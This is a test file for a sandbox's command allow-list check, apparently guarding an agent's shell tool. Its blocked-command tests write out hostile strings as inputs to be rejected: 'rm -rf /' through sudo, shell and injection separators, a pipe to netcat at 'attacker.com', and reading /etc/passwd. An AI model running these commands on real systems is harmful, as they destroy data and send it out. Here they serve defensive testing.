import { describe, expect, test } from 'bun:test';
import { is_command_allowed } from '../tools/sandbox';

describe('is_command_allowed', () => {
	describe('blocked commands (security critical)', () => {
		test('rejects sudo commands', () => {
			expect(is_command_allowed('sudo rm -rf /')).toBe(false);
			expect(is_command_allowed('sudo apt install')).toBe(false);
			expect(is_command_allowed('sudo su')).toBe(false);
		});

		test('rejects bash shell invocation', () => {
			expect(is_command_allowed('bash -c "rm -rf /"')).toBe(false);
			expect(is_command_allowed('bash script.sh')).toBe(false);
			expect(is_command_allowed('bash')).toBe(false);
		});

		test('rejects sh shell invocation', () => {
			expect(is_command_allowed('sh script.sh')).toBe(false);
			expect(is_command_allowed('sh -c "whoami"')).toBe(false);
			expect(is_command_allowed('sh')).toBe(false);
		});

		test('rejects semicolon injection', () => {
			expect(is_command_allowed('; rm -rf /')).toBe(false);
			expect(is_command_allowed(';rm -rf /')).toBe(false);
		});

		test('rejects ampersand injection', () => {
			expect(is_command_allowed('&& rm -rf /')).toBe(false);
			expect(is_command_allowed('&&rm -rf /')).toBe(false);
			expect(is_command_allowed('& rm -rf /')).toBe(false);
		});

		test('rejects pipe injection', () => {
			expect(is_command_allowed('| nc attacker.com')).toBe(false);
			expect(is_command_allowed('|nc attacker.com')).toBe(false);
			expect(is_command_allowed('| cat /etc/passwd')).toBe(false);
		});

		test('rejects other dangerous commands', () => {
			expect(is_command_allowed('nc -l 4444')).toBe(false);
			expect(is_command_allowed('python -c "import os"')).toBe(false);
			expect(is_command_allowed('perl -e "system()"')).toBe(false);
			expect(is_command_allowed('ruby -e "exec()"')).toBe(false);
			expect(is_command_allowed('eval "dangerous"')).toBe(false);
		});
	});

	describe('allowed commands', () => {
		test('allows git commands', () => {
			expect(is_command_allowed('git status')).toBe(true);
			expect(is_command_allowed('git push origin main')).toBe(true);
			expect(is_command_allowed('git commit -m "msg"')).toBe(true);
			expect(is_command_allowed('git clone https://github.com/a/b')).toBe(
				true,
			);
			expect(is_command_allowed('git log --oneline')).toBe(true);
		});

		test('allows npm/bun commands', () => {
			expect(is_command_allowed('npm install')).toBe(true);
			expect(is_command_allowed('npm run build')).toBe(true);
			expect(is_command_allowed('npm test')).toBe(true);
			expect(is_command_allowed('bun test')).toBe(true);
			expect(is_command_allowed('bun install')).toBe(true);
			expect(is_command_allowed('bun run dev')).toBe(true);
		});

		test('allows file listing commands', () => {
			expect(is_command_allowed('ls')).toBe(true);
			expect(is_command_allowed('ls -la')).toBe(true);
			expect(is_command_allowed('ls -la /home/user')).toBe(true);
		});

		test('allows file reading commands', () => {
			expect(is_command_allowed('cat file.txt')).toBe(true);
			expect(is_command_allowed('cat /path/to/file')).toBe(true);
			expect(is_command_allowed('head -n 10 file.txt')).toBe(true);
			expect(is_command_allowed('tail -f log.txt')).toBe(true);
		});

		test('allows absolute path prefixes to standard bins', () => {
			expect(is_command_allowed('/usr/bin/git status')).toBe(true);
			expect(is_command_allowed('/bin/ls -la')).toBe(true);
			expect(is_command_allowed('/usr/local/bin/node app.js')).toBe(true);
		});

		test('allows other standard commands', () => {
			expect(is_command_allowed('pwd')).toBe(true);
			expect(is_command_allowed('echo "hello"')).toBe(true);
			expect(is_command_allowed('grep pattern file.txt')).toBe(true);
			expect(is_command_allowed('find . -name "*.ts"')).toBe(true);
			expect(is_command_allowed('mkdir -p new/dir')).toBe(true);
			expect(is_command_allowed('touch file.txt')).toBe(true);
			expect(is_command_allowed('cp src dst')).toBe(true);
			expect(is_command_allowed('mv old new')).toBe(true);
			expect(is_command_allowed('rm file.txt')).toBe(true);
		});

		test('allows node/tsx commands', () => {
			expect(is_command_allowed('node app.js')).toBe(true);
			expect(is_command_allowed('tsx script.ts')).toBe(true);
			expect(is_command_allowed('npx eslint .')).toBe(true);
		});

		test('allows test runners', () => {
			expect(is_command_allowed('jest')).toBe(true);
			expect(is_command_allowed('vitest run')).toBe(true);
			expect(is_command_allowed('pytest tests/')).toBe(true);
		});
	});

	describe('edge cases', () => {
		test('rejects empty command', () => {
			expect(is_command_allowed('')).toBe(false);
		});

		test('rejects whitespace-only command', () => {
			expect(is_command_allowed('   ')).toBe(false);
			expect(is_command_allowed('\t')).toBe(false);
			expect(is_command_allowed('\n')).toBe(false);
			expect(is_command_allowed('  \t\n  ')).toBe(false);
		});

		test('handles leading whitespace', () => {
			expect(is_command_allowed('  git status')).toBe(true);
			expect(is_command_allowed('\tls -la')).toBe(true);
		});

		test('handles trailing whitespace', () => {
			expect(is_command_allowed('git status  ')).toBe(true);
			expect(is_command_allowed('ls -la\t')).toBe(true);
		});

		test('handles leading and trailing whitespace', () => {
			expect(is_command_allowed('  git status  ')).toBe(true);
			expect(is_command_allowed('\t npm install \t')).toBe(true);
		});
	});
});
